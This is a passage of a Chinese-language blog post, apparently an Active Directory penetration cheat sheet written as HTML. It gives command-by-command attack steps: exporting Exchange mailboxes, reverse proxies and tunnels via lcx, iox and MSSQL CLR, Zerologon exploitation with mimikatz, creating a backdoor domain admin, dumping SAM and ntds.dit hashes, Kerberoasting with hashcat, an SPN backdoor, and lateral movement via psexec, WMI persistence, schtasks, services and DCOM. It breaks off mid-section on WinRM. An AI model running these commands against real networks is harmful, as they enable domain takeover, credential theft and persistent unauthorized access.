+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">获取所有邮箱用户<span style="color:#960050;background-color:#1e0010">：</span>
+
+Get-Mailbox
+
+导出邮件<span style="color:#960050;background-color:#1e0010">：</span>
+
+New-MailboxexportRequest -mailbox username -FilePath (<span style="color:#960050;background-color:#1e0010">“</span>\localhost\c\$\test\username.pst<span style="color:#960050;background-color:#1e0010">”</span>)
+
+也可以通过web口导出<span style="color:#960050;background-color:#1e0010">，</span>登录<span style="color:#960050;background-color:#1e0010">：</span>
+
+https<span style="color:#960050;background-color:#1e0010">:</span>//mail.domain.com/ecp/
+
+导出后会有记录<span style="color:#960050;background-color:#1e0010">，</span>用如下命令可以查看<span style="color:#960050;background-color:#1e0010">：</span>
+
+Get-MailboxExportRequest
+
+删除某个导出记录<span style="color:#960050;background-color:#1e0010">：</span>
+
+Remove-MailboxExportRequest -Identity <span style="color:#960050;background-color:#1e0010">‘</span>username\mailboxexport<span style="color:#960050;background-color:#1e0010">’</span> -Confirm<span style="color:#960050;background-color:#1e0010">:</span>\$false
+</code></pre></div></li>
+</ol>
+<h2 id="0x16-传输通道">0x16 传输通道</h2>
+<ol>
+<li>
+<p>netsh</p>
+<p>A机器执行如下命令</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">netsh interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1 protocol=tcp
+</code></pre></div><p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p>
+</li>
+<li>
+<p>ssh</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#a 开启socks代理：正向代理访问1.1.1.1网络</span>
+ssh -qTfnN -D 1111 root@1.1.1.1
+输入1.1.1.1机器密码<span style="color:#960050;background-color:#1e0010">，</span>本地利用proxychains等类似工具连接本地的1111端口的sock5连接即可代理1.1.1.1的网络<span style="color:#960050;background-color:#1e0010">。</span>
+
+<span style="color:#75715e">#b LOCAL:2121-&gt;HOSTB-&gt;HOST:21</span>
+ssh -CNfg -L 2121<span style="color:#960050;background-color:#1e0010">:</span>HOSTC<span style="color:#960050;background-color:#1e0010">:</span>21 root@HOSTB
+
+<span style="color:#75715e">#c HOSTB:2121-&gt;LOCAL-&gt;HOST:21</span>
+ssh -CNfg -R 2121<span style="color:#960050;background-color:#1e0010">:</span>HOSTC<span style="color:#960050;background-color:#1e0010">:</span>21 root@HOSTB
+</code></pre></div></li>
+<li>
+<p>regeorg</p>
+</li>
+<li>
+<p>ew</p>
+</li>
+<li>
+<p>lcx</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#反向代理</span>
+VPS<span style="color:#960050;background-color:#1e0010">:</span> lcx -listen 1111 2222
+internal<span style="color:#960050;background-color:#1e0010">:</span> lcx -slave VPS 1111 localhost 3389
+local -&gt; VPS<span style="color:#960050;background-color:#1e0010">:</span>2222 -&gt; internal<span style="color:#960050;background-color:#1e0010">:</span>3389
+
+<span style="color:#75715e">#端口转发</span>
+internal<span style="color:#960050;background-color:#1e0010">:</span> lcx.exe -tran 1111 2.2.2.2 8080
+local -&gt; internal<span style="color:#960050;background-color:#1e0010">:</span>1111 -&gt; 2.2.2.2<span style="color:#960050;background-color:#1e0010">:</span>8080
+</code></pre></div></li>
+<li>
+<p>iox</p>
+<p><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#端口转发</span>
+./iox fwd -l 8888 -r 1.1.1.1<span style="color:#960050;background-color:#1e0010">:</span>9999
+0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>8888-&gt;1.1.1.1<span style="color:#960050;background-color:#1e0010">:</span>9999
+
+<span style="color:#75715e">#正向代理</span>
+./iox proxy -l 1080
+
+<span style="color:#75715e">#反向代理</span>
+internal<span style="color:#960050;background-color:#1e0010">：</span>./iox proxy -r VPS<span style="color:#960050;background-color:#1e0010">:</span>9999
+VPS转发<span style="color:#960050;background-color:#1e0010">:</span> ./iox proxy -l 9999 -l 1080 <span style="color:#75715e"># 注意，这两个端口是有顺序的</span>
+localsocks-&gt;VPS<span style="color:#960050;background-color:#1e0010">:</span>1080-&gt;internal
+
+-k keytext <span style="color:#75715e">#启用加密</span>
+</code></pre></div></li>
+<li>
+<p>powercat</p>
+<p>powershell版nc ，未测试</p>
+</li>
+<li>
+<p>mssql</p>
+<p>利用mssql执行clr作为传输通道</p>
+<p><a href="https://github.com/blackarrowsec/mssqlproxy">https://github.com/blackarrowsec/mssqlproxy</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># 连接MSSQL</span>
+CMD&gt; python mssqlclient.py maka8ka.garden/Administrator@10.10.10.1 -windows-auth
+SQL&gt; enable_ole
+SQL&gt; upload reciclador.dll C:\Windows\temp\reciclador.dll                                                              
+[+] Uploading <span style="color:#e6db74">&#39;reciclador.dll&#39;</span> to <span style="color:#e6db74">&#39;C:\Windows\temp\reciclador.dll&#39;</span>...                                                  
+[+] Size is 552448 bytes                                                                                               
+[+] Upload completed                                                                                                   
+SQL&gt; exit
+CMD&gt; python mssqlclient.py maka8ka.garden/Administrator@10.10.10.1 -windows-auth -install -clr Microsoft.SqlServer.Proxy.dll
+CMD&gt; python mssqlclient.py maka8ka.garden/Administrator@10.10.10.1 -windows-auth -check -reciclador <span style="color:#e6db74">&#39;C:\Windows\temp\reciclador.dll&#39;</span>
+CMD&gt; python mssqlclient.py maka8ka.garden/Administrator@10.10.10.1 -windows-auth -start -reciclador <span style="color:#e6db74">&#39;C:\Windows\temp\reciclador.dll&#39;</span>
+[*] ACK<span style="color:#960050;background-color:#1e0010">:</span> Result<span style="color:#960050;background-color:#1e0010">:</span> 1 - Microsoft SQL Server (140 3232)                                                                   
+[*] Proxy mode<span style="color:#960050;background-color:#1e0010">:</span> start                                                                                                  
+[*] Listening on port 1337...                                                                                          
+[*] New connection
+
+CMD&gt; proxychains4 <span style="color:#f92672">-f</span> src/proxychains.conf curl http<span style="color:#960050;background-color:#1e0010">:</span>//10.10.10.11
+<span style="color:#66d9ef">[proxychains]</span> Strict chain  ...  127.0.0.1<span style="color:#960050;background-color:#1e0010">:</span>1337  ...  10.10.10.11<span style="color:#960050;background-color:#1e0010">:</span>80  ...  OK
+</code></pre></div></li>
+</ol>
+<h2 id="0x17-权限提升">0x17 权限提升</h2>
+<ol>
+<li>
+<p>UAC</p>
+</li>
+<li>
+<p>MS14-068</p>
+</li>
+<li>
+<p>exchange漏洞提权</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">net user maka8ka_exchanger 1qaz!QAZ /add /<span style="color:#66d9ef">do</span><span style="color:#960050;background-color:#1e0010">:</span>
+net group <span style="color:#e6db74">&#34;Domain admins&#34;</span> maka8ka_exchanger /add /<span style="color:#66d9ef">do</span><span style="color:#960050;background-color:#1e0010">:</span>
+net group <span style="color:#e6db74">&#34;Discovery Management&#34;</span> maka8ka_exchanger /add /<span style="color:#66d9ef">do</span><span style="color:#960050;background-color:#1e0010">:</span>
+net group <span style="color:#e6db74">&#34;Organization Management&#34;</span> maka8ka_exchanger /add /<span style="color:#66d9ef">do</span><span style="color:#960050;background-color:#1e0010">:</span>
+</code></pre></div></li>
+<li>
+<p>CVE-2020-1472</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">CVE-2020-1472 域内提权漏洞利用
+运行poc查看是否存在漏洞
+lsadump::zerologon /target<span style="color:#960050;background-color:#1e0010">:</span>dc-tpe-ad2016.makapaka.garden /account<span style="color:#960050;background-color:#1e0010">:</span>dc-tpe-neihu6$
+运行exp把域控主机hash置为空
+lsadump::zerologon /target<span style="color:#960050;background-color:#1e0010">:</span>dc-tpe-ad2016.makapaka.garden /account<span style="color:#960050;background-color:#1e0010">:</span>dc-tpe-neihu5$ /exploit
+查看指定用户的hash(此命令需要在域中主机执行)
+lsadump::dcsync /domain<span style="color:#960050;background-color:#1e0010">:</span>maka8ka.garden /dc<span style="color:#960050;background-color:#1e0010">:</span>dc-tpe-ad2016.makapaka.garden /user<span style="color:#960050;background-color:#1e0010">:</span>administrator /authuser<span style="color:#960050;background-color:#1e0010">:</span>dc-tpe-ad2016$ /authdomain<span style="color:#960050;background-color:#1e0010">:</span>MAKAPAKA /authpassword<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;&#34;</span> /authntlm
+恢复密码
+lsadump::postzerologon /target<span style="color:#960050;background-color:#1e0010">:</span>dc-tpe-ad2016.makapaka.garden /account<span style="color:#960050;background-color:#1e0010">:</span>dc-tpe-ad2016$
+</code></pre></div></li>
+</ol>
+<h2 id="0x18-密码获取">0x18 密码获取</h2>
+<ol>
+<li>
+<p>本地用户凭据</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">reg save hklm\sam c:\windows\temp\sam.hive
+reg save hklm\system c:\windows\temp\system.hive
+reg save hklm\security c:\windows\temp\security.hive
+
+saminside.exe
+</code></pre></div></li>
+<li>
+<p>域用户凭据</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">域控制器抓取域成员hash<span style="color:#960050;background-color:#1e0010">（</span>2008,2012<span style="color:#960050;background-color:#1e0010">，</span>2016<span style="color:#960050;background-color:#1e0010">）</span>
+ntdsutil  snapshot  <span style="color:#e6db74">&#34;list all&#34;</span> quit quit  //查看全部快照
+ntdsutil  snapshot  <span style="color:#e6db74">&#34;activate  instance  ntds&#34;</span> create quit quit  //创建快照
+ntdsutil  snapshot  <span style="color:#e6db74">&#34;list all&#34;</span> quit quit  //查看全部快照
+ntdsutil  snapshot  <span style="color:#e6db74">&#34;mount {d3xxxxxed-5474-4929-8273-e8xxxxx2af}&#34;</span> quit quit  //挂载快照为文件夹
+copy C:\$SNAP_20170xxxx256_VOLUMEC$\windows\ntds\ntds.dit  //拷贝快照文件夹中hash存储文件
+ntdsutil  snapshot  <span style="color:#e6db74">&#34;unmount {xxxxxxe86-84f0-41c4-816c-13xxxxx6de0d}&#34;</span> quit quit   //卸载快照
+ntdsutil  snapshot  <span style="color:#e6db74">&#34;delete {98xxxxx0e-86ba-4ac2-acc4-f8xxxxx3}&#34;</span> quit quit    //删除快照
+<span style="color:#e6db74">&#34;C:\Program Files\7-Zip\7z.exe&#34;</span> a ntds.7z C:\windows\system32\ntds.dit   //压缩hash存储文件+
+
+NTDSDumpEx.exe -d ntds.dit -o hash.txt -s system.hive
+</code></pre></div></li>
+</ol>
+<h2 id="0x19-token窃取">0x19 token窃取</h2>
+<p><a href="https://maka8ka.github.io/post/windows-%E7%A8%8B%E5%BA%8F%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8/">Windows-程序降权启动</a></p>
+<h2 id="0x20-kerberoasting">0x20 Kerberoasting</h2>
+<h3 id="简介">简介</h3>
+<pre><code>在KRB_TGS_REP中，TGS会返回给Client一张票据ST，而ST是由Client请求的Server端密码进行加密的。当Kerberos协议设置票据为RC4方式加密时，我们就可以通过爆破在Client端获取的票据ST，从而获得Server端的密码。
+</code></pre><p>理解为，利用已知的与用户注册SPN，请求TGS，导出请求的TGS本地进行爆破</p>
+<p>需要在域内主机执行</p>
+<p>原理</p>
+<p><img src="/images/WindowsInternalAttack/Untitled.png" alt="/images/WindowsInternalAttack/Untitled.png"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">as_request
+as_reply
+tgs_request
+tgs_reply
+ap_request
+ap_reply
+对于4.tgs_reply<span style="color:#960050;background-color:#1e0010">，</span>用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)<span style="color:#960050;background-color:#1e0010">，</span>加密算法为RC4-HMAC
+
+站在利用的角度<span style="color:#960050;background-color:#1e0010">，</span>当获得这个TGS后<span style="color:#960050;background-color:#1e0010">，</span>我们可以尝试穷举口令<span style="color:#960050;background-color:#1e0010">，</span>模拟加密过程<span style="color:#960050;background-color:#1e0010">，</span>生成TGS进行比较<span style="color:#960050;background-color:#1e0010">。</span>如果TGS相同<span style="color:#960050;background-color:#1e0010">，</span>代表口令正确<span style="color:#960050;background-color:#1e0010">，</span>就能获得目标服务实例的明文口令
+</code></pre></div><h3 id="利用方法一">利用方法一</h3>
+<p>1、获取有价值的SPN</p>
+<p>需满足条件</p>
+<ul>
+<li>该SPN注册在域用户帐户(Users)下</li>
+<li>域用户账户的权限很高</li>
+</ul>
+<p>(1)使用powershell模块Active Directory</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">域控上默认安装
+import-module ActiveDirectory
+get-aduser -filter {AdminCount <span style="color:#f92672">-eq</span> 1 <span style="color:#f92672">-and</span> (servicePrincipalName <span style="color:#f92672">-ne</span> 0)} -prop * |select name,whencreated,pwdlastset,lastlogon
+</code></pre></div><p>默认未安装导入dll</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">import-module .\Microsoft.ActiveDirectory.Management.dll
+</code></pre></div><p><a href="/images/WindowsInternalAttack/Microsoft.ActiveDirectory.Management.zip">Microsoft.ActiveDirectory.Management.zip</a></p>
+<p>(2)使用PowerView</p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon
+</code></pre></div><p>(3)使用kerberoast</p>
+<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
+<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">cscript GetUserSPNs.vbs
+</code></pre></div><p>2、请求TGS</p>
+<p>(1)请求指定TGS</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$SPNName = <span style="color:#e6db74">&#39;MSSQLSvc/DC1.test.com&#39;</span>
+Add-Type -AssemblyNAme System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
+</code></pre></div><p>(2)请求所有TGS</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Add-Type -AssemblyName System.IdentityModel
+setspn.exe -q */* | Select-String <span style="color:#e6db74">&#39;^CN&#39;</span> -Context 0,1 | % {New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim()}
+</code></pre></div><p>使用klist命令查看内存中的票据</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\dev1\Desktop&gt; klist
+
+当前登录 ID 是 0<span style="color:#960050;background-color:#1e0010">:</span>0x12f1c6
+
+缓存的票证<span style="color:#960050;background-color:#1e0010">:</span> (10)
+
+<span style="color:#75715e">#0&gt;     客户端: Dev1 @ MAKAPAKA.GARDEN</span>
+        服务器<span style="color:#960050;background-color:#1e0010">:</span> krbtgt/MAKAPAKA.GARDEN @ MAKAPAKA.GARDEN
+        Kerberos 票证加密类型<span style="color:#960050;background-color:#1e0010">:</span> AES-256-CTS-HMAC-SHA1-96
+        票证标志 0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize
+        开始时间<span style="color:#960050;background-color:#1e0010">:</span> 6/30/2020 17<span style="color:#960050;background-color:#1e0010">:</span>10<span style="color:#960050;background-color:#1e0010">:</span>39 (本地)
+        结束时间<span style="color:#960050;background-color:#1e0010">:</span>   7/1/2020 3<span style="color:#960050;background-color:#1e0010">:</span>10<span style="color:#960050;background-color:#1e0010">:</span>39 (本地)
+        续订时间<span style="color:#960050;background-color:#1e0010">:</span> 7/7/2020 17<span style="color:#960050;background-color:#1e0010">:</span>10<span style="color:#960050;background-color:#1e0010">:</span>39 (本地)
+        会话密钥类型<span style="color:#960050;background-color:#1e0010">:</span> AES-256-CTS-HMAC-SHA1-96
+        缓存标志<span style="color:#960050;background-color:#1e0010">:</span> 0x2 -&gt; DELEGATION
+        调用的 KDC<span style="color:#960050;background-color:#1e0010">:</span> AD2012.makapaka.garden
+
+<span style="color:#75715e">#1&gt;     客户端: Dev1 @ MAKAPAKA.GARDEN</span>
+        服务器<span style="color:#960050;background-color:#1e0010">:</span> krbtgt/MAKAPAKA.GARDEN @ MAKAPAKA.GARDEN
+        Kerberos 票证加密类型<span style="color:#960050;background-color:#1e0010">:</span> AES-256-CTS-HMAC-SHA1-96
+        票证标志 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
+        开始时间<span style="color:#960050;background-color:#1e0010">:</span> 6/30/2020 17<span style="color:#960050;background-color:#1e0010">:</span>10<span style="color:#960050;background-color:#1e0010">:</span>39 (本地)
+        结束时间<span style="color:#960050;background-color:#1e0010">:</span>   7/1/2020 3<span style="color:#960050;background-color:#1e0010">:</span>10<span style="color:#960050;background-color:#1e0010">:</span>39 (本地)
+        续订时间<span style="color:#960050;background-color:#1e0010">:</span> 7/7/2020 17<span style="color:#960050;background-color:#1e0010">:</span>10<span style="color:#960050;background-color:#1e0010">:</span>39 (本地)
+        会话密钥类型<span style="color:#960050;background-color:#1e0010">:</span> AES-256-CTS-HMAC-SHA1-96
+        缓存标志<span style="color:#960050;background-color:#1e0010">:</span> 0x1 -&gt; PRIMARY
+        调用的 KDC<span style="color:#960050;background-color:#1e0010">:</span> AD2012.makapaka.garden
+</code></pre></div><p>3、导出</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">mimikatz
+kerberos::list /export
+</code></pre></div><p>4、破解</p>
+<p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">./tgsrepcrack.py wordlist.txt test.kirbi
+</code></pre></div><h3 id="利用方法二">利用方法二</h3>
+<p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p>
+<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
+<p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p>
+<p><a href="/images/WindowsInternalAttack/Invoke-Kerberoast.zip">Invoke-Kerberoast.zip</a></p>
+<p>域内普通机器</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">import-module ./Invoke-Kerberoast.ps1
+Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
+<span style="color:#75715e">#-AdminCount表示选择高权限的用户</span>
+
+<span style="color:#75715e">#只提取出hash的参数如下：</span>
+Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
+</code></pre></div><p>hashcat 破解</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
+</code></pre></div><h3 id="kerberoasting的后门">Kerberoasting的后门</h3>
+<p>取得了SPN的修改权限，为指定的域用户添加一个SPN，随时获得该域用户的TGS，破解后获得明文口令</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#例如为域用户Administrator添加SPNVNC/DC1.test.com，参数如下：</span>
+setspn.exe -U -A VNC/DC1.test.com Administrator
+</code></pre></div><p>在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS</p>
+<p>再使用hashcat破解即可</p>
+<p>参考文章：<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">https://3gstudent.github.io/域渗透-Kerberoasting</a></p>
+<h2 id="0x21-laps">0x21 LAPS</h2>
+<p><a href="https://maka8ka.github.io/post/%E5%9F%9F%E6%B8%97%E9%80%8F-sysvol%E5%AF%86%E7%A0%81-laps/">域渗透-SYSVOL密码-LAPS</a></p>
+<h2 id="0x22-横向移动">0x22 横向移动</h2>
+<ol>
+<li>
+<p>IPC</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">net use \\10.10.0.1\ipc\$ <span style="color:#960050;background-color:#1e0010">“</span>password<span style="color:#960050;background-color:#1e0010">”</span> /user<span style="color:#960050;background-color:#1e0010">:</span>username
+</code></pre></div></li>
+<li>
+<p>Psexec</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">psexec \\10.10.0.1 -accepteula -u administrator -p password cmd.exe
+psexec \\10.10.0.1 -accepteula -u administrator -p password -s cmd /c <span style="color:#e6db74">&#34;quser&#34;</span>
+psexec.py makapaka.garden/administrator<span style="color:#960050;background-color:#1e0010">:</span>password@10.10.0.1
+</code></pre></div></li>
+<li>
+<p>WMI</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">方法一 
+wmic /user<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;makapaka.garden\Dev1&#34;</span> /password<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;password&#34;</span> /node<span style="color:#960050;background-color:#1e0010">:</span>10.10.0.1 <span style="color:#66d9ef">process</span> call create <span style="color:#e6db74">&#34;notepad&#34;</span>
+
+方法二 
+Invoke-WmiMethod -class win32_process -name create -argumentlist <span style="color:#e6db74">&#39;notepad&#39;</span> -ComputerName 10.10.0.1 -Credential <span style="color:#e6db74">&#39;makapaka.garden\Dev1&#39;</span>
+
+方法三
+$filterName = <span style="color:#e6db74">&#39;BotFilter82&#39;</span>
+$consumerName = <span style="color:#e6db74">&#39;BotConsumer23&#39;</span>
+$exePath = <span style="color:#e6db74">&#39;C:\Windows\System32\notepad.exe&#39;</span>
+$Query = <span style="color:#e6db74">&#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&#34;</span>
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{Name=$filterName;EventNameSpace=<span style="color:#e6db74">&#34;root\cimv2&#34;</span>;QueryLanguage=<span style="color:#e6db74">&#34;WQL&#34;</span>;Query=$Query} -ErrorAction Stop -ComputerName 10.10.0.1 -Credential <span style="color:#e6db74">&#39;makapaka.garden\Dev1&#39;</span>
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}  -ComputerName 10.10.0.1 -Credential <span style="color:#e6db74">&#39;makapaka.garden\Dev1&#39;</span>
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{<span style="color:#66d9ef">Filter</span>=$WMIEventFilter;Consumer=$WMIEventConsumer}
+</code></pre></div></li>
+<li>
+<p>Schtasks</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">schtasks /create /s 10.10.0.1 /u makapaka.garden\Dev1 /p password /ru <span style="color:#e6db74">&#34;SYSTEM&#34;</span> /tn <span style="color:#e6db74">&#34;windowsupdate&#34;</span> /sc DAILY /tr <span style="color:#e6db74">&#34;calc&#34;</span> /F 
+schtasks /run /s 10.10.0.1 /u makapaka.garden\Dev1 /p password /tn windowsupdate
+</code></pre></div></li>
+<li>
+<p>AT</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">at \10.10.0.1 09<span style="color:#960050;background-color:#1e0010">:</span>56 calc
+</code></pre></div></li>
+<li>
+<p>SC</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">sc \10.10.0.1 create windowsupdate binpath= <span style="color:#e6db74">&#34;calc&#34;</span> sc \10.10.0.1 start windowsupdate
+</code></pre></div></li>
+<li>
+<p>REG</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">reg add \10.10.0.1\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t REG_SZ /d <span style="color:#e6db74">&#34;calc&#34;</span>
+</code></pre></div></li>
+<li>
+<p>DCOM</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">方法一
+$com = <span style="color:#66d9ef">[activator]</span>::CreateInstance(<span style="color:#66d9ef">[type]</span>::GetTypeFromProgID(<span style="color:#e6db74">&#34;MMC20.Application&#34;</span>,<span style="color:#e6db74">&#34;10.10.0.1&#34;</span>))
+$com.Document.ActiveView.ExecuteShellCommand(<span style="color:#e6db74">&#39;cmd.exe&#39;</span>,$null,<span style="color:#e6db74">&#34;/c calc.exe&#34;</span>,<span style="color:#e6db74">&#34;Minimized&#34;</span>)
+方法二
+$com = <span style="color:#66d9ef">[Type]</span>::GetTypeFromCLSID(<span style="color:#e6db74">&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;</span>,<span style="color:#e6db74">&#34;10.10.0.1&#34;</span>)
+$obj = <span style="color:#66d9ef">[System.Activator]</span>::CreateInstance($com)
+$item = $obj.item()
+$item.Document.Application.ShellExecute(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>,<span style="color:#e6db74">&#34;/c calc.exe&#34;</span>,<span style="color:#e6db74">&#34;c:\windows\system32&#34;</span>,$null,0)
+方法三
+$com = <span style="color:#66d9ef">[Type]</span>::GetTypeFromCLSID(<span style="color:#e6db74">&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;</span>,<span style="color:#e6db74">&#34;10.10.0.1&#34;</span>)
+$obj = <span style="color:#66d9ef">[System.Activator]</span>::CreateInstance($com)
+$obj.Document.Application.ShellExecute(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>,<span style="color:#e6db74">&#34;/c calc.exe&#34;</span>,<span style="color:#e6db74">&#34;c:\windows\system32&#34;</span>,$null,0)
+</code></pre></div></li>
+<li>
+<p>WIMRM</p>
+<ol>
+<li>在Windows Vista上必须手动启动WinRM服务，但从Windows Server 2008开始，WinRM服务自动启动</li>
+<li>默认情况下，WinRM服务后台已经运行，但并不开启监听模式，因此无法接受和发送数据</li>
+<li>使用WinRM提供的<code>quickconfig</code>对WinRM进行配置后，Windows将开启监听并打开HTTP及HTTPS监听端口，同时Windows防火墙生成这两个端口的例外</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">开启winrm
+查看状态
+winrm enumerate winrm/config/listener
+
+基础配置
+winrm quickconfig
+
+查看状态
